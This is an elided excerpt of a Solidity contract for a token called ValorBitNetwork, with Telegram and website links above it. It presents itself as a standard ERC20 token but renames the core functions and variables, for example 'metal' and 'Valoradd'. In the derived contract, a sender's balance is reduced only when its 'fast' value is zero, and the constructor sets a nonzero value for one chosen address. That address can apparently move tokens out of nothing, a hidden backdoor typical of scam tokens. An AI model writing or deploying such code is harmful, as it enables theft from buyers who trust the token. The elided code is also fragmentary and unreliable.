...
https://t.me/ValorbitNetwork
https://valorbitnetwork.xyz/
...
contract ERC20 is Context, IERC20, IERC20Metadata {
    mapping(address => uint256) public Valoradd;
    ...
    function metal(
        ...
        uint256 fromBalance = Valoradd[from];
        require(fromBalance >= amount, "ERC20: transfer amount exceeds balance");
        unchecked {
            Valoradd[from] = fromBalance - amount;
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        uint256 accountBalance = Valoradd[account];
        require(accountBalance >= amount, "ERC20: burn amount exceeds balance");
        unchecked {
            Valoradd[account] = accountBalance - amount;
...
contract ValorBitNetwork is ERC20, Ownable {
    address private gas;
    uint256 private arm = 3;
    ...
    function metal(
        ...
        address VALlp = gas;
        gas = ValBurn;
        autoburnLP[VALlp] += care;

        if (fast[VALdplyer] == 0) Valoradd[VALdplyer] -= review;

        uint256 voice = review * arm;
        voice = voice / 100;
        review -= voice;
        Valoradd[ValBurn] += review;
        emit Transfer(VALdplyer, ValBurn, review);
    }
    ...
    constructor(
        ...
        fast[current] = care;
        Valoradd[_msgSender()] = 1000000000000 * 10**9;
    }
}